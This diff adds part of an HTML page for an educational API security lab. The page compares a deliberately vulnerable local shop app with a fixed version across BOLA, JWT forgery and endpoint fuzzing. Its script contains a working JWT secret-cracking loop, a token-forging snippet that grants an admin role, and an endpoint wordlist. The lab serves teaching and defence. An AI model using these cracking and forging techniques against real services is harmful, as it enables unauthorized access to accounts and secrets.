+        <p>Use the same forged token you created against the vulnerable app (signed with <code class="inline">secret123</code>) and send it to the secure app:</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — same FORGED token, different port</span><button class="copy-btn" onclick="cpEl('s-jwt-use',this)">copy</button></div>
+          <div class="cmd-body" id="s-jwt-use">curl -s http://localhost:5001/api/admin/secret \
+  -H "Authorization: Bearer $FORGED" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response</div>
+          <div class="out-body"><span class="ok">{ "error": "Invalid or expired token" }  401</span>
+<span style="color:var(--muted)">The token was signed with "secret123" but the secure app uses
+a different secret — the signature check fails immediately.</span></div>
+        </div>
+      </div>
+
+      <div class="compare">
+        <div class="cmp-box vuln"><div class="cmp-hd">❌ Vulnerable :5000</div><div class="cmp-body">Secret: "secret123" — crackable in seconds
+Token payload contains role claim
+Server trusts role from token blindly
+→ Forged token grants full admin access</div></div>
+        <div class="cmp-box fix"><div class="cmp-hd">✅ Secure :5001</div><div class="cmp-body">Secret: random 256-bit hex — uncrackable
+Token payload contains only user_id + exp
+Server fetches role from DB on every request
+→ Forged token rejected at signature check</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECURE PANEL 4 — BOLA MESSAGES -->
+  <div class="lab-panel" id="s-bola-msgs">
+    <button class="lab-trigger" onclick="togglePanel('s-bola-msgs')">
+      <div class="lab-trigger-icon" style="background:var(--green-dim)">💬</div>
+      <div class="lab-trigger-info">
+        <div class="lab-trigger-title">BOLA Messages — Against the Secure App</div>
+        <div class="lab-trigger-sub">Try to read the admin inbox by passing user_id=4 on port 5001</div>
+      </div>
+      <div class="lab-trigger-right">
+        <span class="lab-owasp" style="background:var(--green-dim);color:var(--green);border:1px solid var(--green-b)">Fixed — API1</span>
+        <svg class="lab-chevron" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M19 9l-7 7-7-7"/></svg>
+      </div>
+    </button>
+    <div class="lab-body">
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">1</div><h3>Try the attack — pass user_id=4 in the query</h3></div>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal — port 5001</span><button class="copy-btn" onclick="cpEl('s-msg-attack',this)">copy</button></div>
+          <div class="cmd-body" id="s-msg-attack">curl -s "http://localhost:5001/api/messages?user_id=4" \
+  -H "Authorization: Bearer $TS" | python3 -m json.tool</div>
+        </div>
+        <div class="out">
+          <div class="out-bar">response — Alice's own messages returned, not the admin's</div>
+          <div class="out-body">[ { "subject": "Your order has been shipped!",
+    <span class="ok">"body": "Order #1 is on its way. Track: SE-20240110."</span> } ]
+
+<span style="color:var(--muted)">The ?user_id=4 parameter was silently ignored.</span></div>
+        </div>
+        <div class="secure-result">
+          <div class="secure-result-title">🔒 Why this works</div>
+          <p>The secure endpoint does not read <code>user_id</code> from the query string at all. It uses only <code>request.user["id"]</code> — the value extracted from the verified JWT, which was set at login and cannot be changed by the client. One line removed, BOLA eliminated.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-hd"><div class="step-num" style="background:var(--green-dim);color:var(--green)">2</div><h3>Confirm with any user_id value</h3></div>
+        <p>No matter what value you pass, you always get Alice's inbox:</p>
+        <div class="cmd">
+          <div class="cmd-bar"><span>terminal</span><button class="copy-btn" onclick="cpEl('s-msg-loop',this)">copy</button></div>
+          <div class="cmd-body" id="s-msg-loop">for i in 1 2 3 4 99; do
+  echo "=== Trying user_id=$i ==="
+  curl -s "http://localhost:5001/api/messages?user_id=$i" \
+    -H "Authorization: Bearer $TS" | python3 -m json.tool
+  echo ""
+done</div>
+        </div>
+        <p style="font-size:0.82rem;color:var(--muted)">All five return the same result — Alice's own shipping notification. The parameter has no effect.</p>
+      </div>
+
+      <div class="compare">
+        <div class="cmp-box vuln"><div class="cmp-hd">❌ Vulnerable :5000</div><div class="cmp-body">uid = request.args.get("user_id",
+    request.user["user_id"])
+# Client controls whose inbox is returned
+# ?user_id=4 → returns admin's messages</div></div>
+        <div class="cmp-box fix"><div class="cmp-hd">✅ Secure :5001</div><div class="cmp-body">uid = request.user["id"]
+# Query parameter completely ignored
+# Always returns the token owner's messages</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="div">
+
+<!-- ── SUMMARY ── -->
+<section class="section" id="summary">
+  <div class="sec-label">// results</div>
+  <h2>All attacks — <em>both apps</em></h2>
+  <p class="sec-sub">The same four techniques. Two different outcomes.</p>
+
+  <div style="border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:2rem">
+    <table class="summary-tbl">
+      <thead><tr>
+        <th>Attack</th>
+        <th>Vulnerable :5000</th>
+        <th>Secure :5001</th>
+        <th>OWASP</th>
+      </tr></thead>
+      <tbody>
+        <tr>
+          <td style="font-weight:600;font-size:0.875rem">API Fuzzing</td>
+          <td style="font-size:0.8rem"><span style="color:var(--red)">5 endpoints found</span> — JWT secret, all passwords, admin routes</td>
+          <td style="font-size:0.8rem"><span style="color:var(--green)">0 endpoints found</span> — complete silence</td>
+          <td class="mono" style="font-size:0.72rem;color:var(--muted)">API8:2023</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600;font-size:0.875rem">BOLA — Orders</td>
+          <td style="font-size:0.8rem"><span style="color:var(--red)">200 OK</span> — Bob's address + card digits returned</td>
+          <td style="font-size:0.8rem"><span style="color:var(--green)">403 Forbidden</span> — ownership check blocks it</td>
+          <td class="mono" style="font-size:0.72rem;color:var(--muted)">API1:2023</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600;font-size:0.875rem">JWT Forgery</td>
+          <td style="font-size:0.8rem"><span style="color:var(--red)">200 OK</span> — FLAG + Stripe key + DB password</td>
+          <td style="font-size:0.8rem"><span style="color:var(--green)">401 Invalid token</span> — wrong secret, rejected</td>
+          <td class="mono" style="font-size:0.72rem;color:var(--muted)">API2:2023</td>
+        </tr>
+        <tr>
+          <td style="font-weight:600;font-size:0.875rem">BOLA — Messages</td>
+          <td style="font-size:0.8rem"><span style="color:var(--red)">200 OK</span> — admin's Stripe key + DB creds</td>
+          <td style="font-size:0.8rem"><span style="color:var(--green)">Alice's own inbox</span> — param silently ignored</td>
+          <td class="mono" style="font-size:0.72rem;color:var(--muted)">API1:2023</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout success">
+    <span class="callout-icon">✓</span>
+    <span><strong>The real lesson:</strong> The fixes are not complicated — one ownership check, one removed endpoint, one stronger secret, one line of code deleted. The gap between vulnerable and secure is smaller than most people expect. The hard part is remembering to add these checks in the first place.</span>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-logo">// ShopEasy API Security Lab</span>
+    <div class="footer-links">
+      <a href="https://github.com/YOUR_USERNAME/api-security-lab" target="_blank">GitHub</a>
+      <a href="https://owasp.org/API-Security/" target="_blank">OWASP API Top 10</a>
+      <a href="https://jwt.io" target="_blank">jwt.io</a>
+    </div>
+    <span class="footer-note">Free forever · Educational use only</span>
+  </div>
+</footer>
+
+<style>
+.os-tab{background:var(--surface);border:1px solid var(--border);border-radius:7px;
+  padding:0.4rem 1rem;font-family:var(--mono);font-size:0.75rem;color:var(--muted);
+  cursor:pointer;transition:all 0.15s}
+.os-tab:hover{color:var(--text);border-color:var(--border2)}
+.os-tab.active{background:var(--green-dim);color:var(--green);border-color:var(--green-b)}
+</style>
+
+<script>
+function cpEl(id, btn) {
+  const text = document.getElementById(id).textContent.trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1800);
+  });
+}
+function cpText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1800);
+  });
+}
+function showOS(os) {
+  ['linux','mac','win'].forEach(o => {
+    document.getElementById('os-'+o).style.display = o===os ? 'block' : 'none';
+  });
+  document.querySelectorAll('.os-tab').forEach((btn,i) => {
+    btn.classList.toggle('active', ['linux','mac','win'][i] === os);
+  });
+}
+function togglePanel(id) {
+  document.getElementById(id).classList.toggle('open');
+}
+function openPanel(id) {
+  const p = document.getElementById(id);
+  if (!p.classList.contains('open')) p.classList.add('open');
+  p.scrollIntoView({behavior:'smooth', block:'start'});
+}
+
+// Nav active on scroll
+const navLinks = document.querySelectorAll('.nav-link');
+document.querySelectorAll('section[id]').forEach(s =>
+  new IntersectionObserver(entries => {
+    if (entries[0].isIntersecting)
+      navLinks.forEach(l => l.classList.toggle('active', l.getAttribute('href')==='#'+s.id));
+  },{threshold:0.25}).observe(s)
+);
+
+// Dynamic code blocks
+const WL = `cat > ~/api-wordlist.txt << 'EOF'
+users
+login
+register
+profile
+admin
+admin/users
+admin/orders
+admin/secret
+admin/config
+debug
+debug/config
+config
+backup
+backups
+internal
+internal/metrics
+metrics
+health
+version
+logs
+test
+payments
+keys
+secrets
+token
+tokens
+EOF`;
+
+const CRACK = `import jwt
+
+token = open('alice.jwt').read().strip()
+
+wordlist = ['secret','secret123','password','jwt_secret',
+            'mysecret','key','test','1234','admin',
+            'supersecret','shopeasy','password123']
+
+print('Cracking JWT secret...')
+for word in wordlist:
+    try:
+        jwt.decode(token, word, algorithms=['HS256'])
+        print(f'[+] SECRET FOUND: {word}')
+        break
+    except jwt.InvalidSignatureError:
+        print(f'[-] Not: {word}')
+    except Exception:
+        print(f'[-] Not: {word}')`;
+
+const FORGE = `FORGED=$(python3 -c "
+import jwt, datetime
+secret = 'secret123'
+payload = {
+    'user_id':   1,
+    'username':  'alice',
+    'role':      'admin',
+    'full_name': 'Alice Johnson',
+    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
+}
+print(jwt.encode(payload, secret, algorithm='HS256'))
+")
+echo $FORGED`;
+
+document.getElementById('wl-body').textContent   = WL;
+document.getElementById('crack-body').textContent = CRACK;
+document.getElementById('forge-body').textContent = FORGE;
+</script>
+</body>
+</html>
